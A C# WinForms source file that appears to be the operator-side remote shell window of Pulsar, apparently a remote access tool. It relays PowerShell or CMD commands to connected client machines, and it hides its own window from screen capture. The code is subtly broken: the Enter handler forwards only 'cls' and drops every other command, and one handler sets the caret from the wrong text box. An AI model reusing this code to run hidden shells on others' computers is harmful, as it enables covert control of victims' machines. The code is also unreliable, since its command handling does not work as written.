using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmRemoteShell : Form
    {
        private readonly Client _connectClient;
        public readonly RemoteShellHandler RemoteShellHandler;

        private static readonly Dictionary<Client, FrmRemoteShell> OpenedForms =
            new Dictionary<Client, FrmRemoteShell>();

        public static FrmRemoteShell CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
                return OpenedForms[client];

            FrmRemoteShell f = new FrmRemoteShell(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        public FrmRemoteShell(Client client)
        {
            _connectClient = client;
            RemoteShellHandler = new RemoteShellHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            txtConsoleInput.Multiline = true;
            txtConsoleInput.ScrollBars = ScrollBars.Vertical;
            txtConsoleInput.AcceptsReturn = true;
            txtConsoleInput.WordWrap = false;
            txtConsoleInput.Height = 120; // make larger


            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            ApplyAutoTheme();

            txtConsoleOutput.AppendText(">> Type 'exit' to close this session or 'cls' to clear." + Environment.NewLine);
        }

        private bool IsDarkBackground()
        {
            int brightness = (this.BackColor.R + this.BackColor.G + this.BackColor.B) / 3;
            return brightness < 128;
        }

        private void ApplyAutoTheme()
        {
            if (IsDarkBackground())
            {
                txtConsoleOutput.BackColor = Color.FromArgb(30, 30, 30);
                txtConsoleOutput.ForeColor = Color.WhiteSmoke;

                txtConsoleInput.BackColor = Color.FromArgb(30, 30, 30);
                txtConsoleInput.ForeColor = Color.WhiteSmoke;
            }
            else
            {
                txtConsoleOutput.BackColor = Color.White;
                txtConsoleOutput.ForeColor = Color.Black;

                txtConsoleInput.BackColor = Color.White;
                txtConsoleInput.ForeColor = Color.Black;
            }
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            RemoteShellHandler.ProgressChanged += CommandOutput;
            RemoteShellHandler.CommandError += CommandError;
            MessageHandler.Register(RemoteShellHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(RemoteShellHandler);
            RemoteShellHandler.ProgressChanged -= CommandOutput;
            RemoteShellHandler.CommandError -= CommandError;
            _connectClient.ClientState -= ClientDisconnected;
        }
        private void CommandOutput(object sender, string output)
        {
            txtConsoleOutput.SelectionColor = Color.White;
            txtConsoleOutput.AppendText(output);
        }


        private void CommandError(object sender, string output)
        {
            txtConsoleOutput.SelectionColor = Color.Red;
            txtConsoleOutput.AppendText(output);
        }


        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                this.Invoke((MethodInvoker)this.Close);
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;
            this.Text = WindowHelper.GetWindowTitle("Remote Shell", _connectClient);

            contextMenuStrip1.Items.Add(togglePowerShellToolStripMenuItem);

            txtConsoleOutput.ContextMenuStrip = contextMenuStrip1;
            txtConsoleInput.ContextMenuStrip = contextMenuStrip1;

            // We start in PowerShell mode
            usePowerShell = true;

            // Correct menu text for initial state
            togglePowerShellToolStripMenuItem.Text = "Switch to CMD";

            suppressSwitchMessage = true;
            RemoteShellHandler.SendCommand("##switchshell::powershell");
            suppressSwitchMessage = false;
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);

            // Apply PowerShell blue AFTER the form is fully displayed
            ApplyShellTheme();
        }


        private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            RemoteShellHandler.Dispose();

            if (_connectClient.Connected)
                RemoteShellHandler.SendCommand("exit");
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            NativeMethodsHelper.ScrollToBottom(txtConsoleOutput.Handle);
        }

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true;
                e.Handled = true;

                string input = txtConsoleInput.Text;

                if (string.IsNullOrWhiteSpace(input))
                {
                    txtConsoleInput.Clear();
                    return;
                }

                txtConsoleInput.Clear();

                // ==============================
                //      HANDLE CLS LOCALLY
                // ==============================
                if (input.Trim().Equals("cls", StringComparison.OrdinalIgnoreCase))
                {
                    txtConsoleOutput.Clear();

                    // Tell client to clear based on active shell
                    if (usePowerShell)
                    {
                        // PowerShell uses host clear
                        RemoteShellHandler.SendCommand("##clear");
                    }
                    else
                    {
                        // CMD must receive real CLS
                        RemoteShellHandler.SendCommand("cls");
                    }

                    return;
                }

            }
        }


        private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = true;  // <--- stops the beep
            if (e.KeyChar != (char)2)
            {
                txtConsoleInput.Text += e.KeyChar.ToString();
                txtConsoleInput.Focus();
                txtConsoleInput.SelectionStart = txtConsoleOutput.TextLength;
                txtConsoleInput.ScrollToCaret();
            }
        }
        private bool usePowerShell = false;
        private bool suppressSwitchMessage = false;

        private void togglePowerShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            usePowerShell = !usePowerShell;

            string mode = usePowerShell ? "powershell" : "cmd";
            string label = usePowerShell ? "Switch to CMD" : "Switch to PowerShell";

            togglePowerShellToolStripMenuItem.Text = label;

            // Tell client to switch interpreter
            RemoteShellHandler.SendCommand("##switchshell::" + mode);

            // Apply local theme immediately
            ApplyShellTheme();
        }
        private void ApplyShellTheme()
        {
            if (usePowerShell)
            {
                // PowerShell (blue)
                Color bg = Color.FromArgb(13, 32, 68);

                txtConsoleOutput.BackColor = bg;
                txtConsoleInput.BackColor = bg;

                txtConsoleOutput.ForeColor = Color.White;
                txtConsoleInput.ForeColor = Color.White;
            }
            else
            {
                // CMD (black)
                txtConsoleOutput.BackColor = Color.Black;
                txtConsoleInput.BackColor = Color.Black;

                txtConsoleOutput.ForeColor = Color.White;
                txtConsoleInput.ForeColor = Color.White;
            }
        }


        private void txtConsoleInput_TextChanged(object sender, EventArgs e)
        {

        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                // If the user highlighted text — copy only that.
                if (!string.IsNullOrEmpty(txtConsoleOutput.SelectedText))
                {
                    Clipboard.SetText(txtConsoleOutput.SelectedText);
                }
                else
                {
                    // Otherwise copy the entire output console text
                    Clipboard.SetText(txtConsoleOutput.Text);
                }
            }
            catch { }
        }

        private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetText(txtConsoleOutput.Text);
            }
            catch { }
        }

    }
}
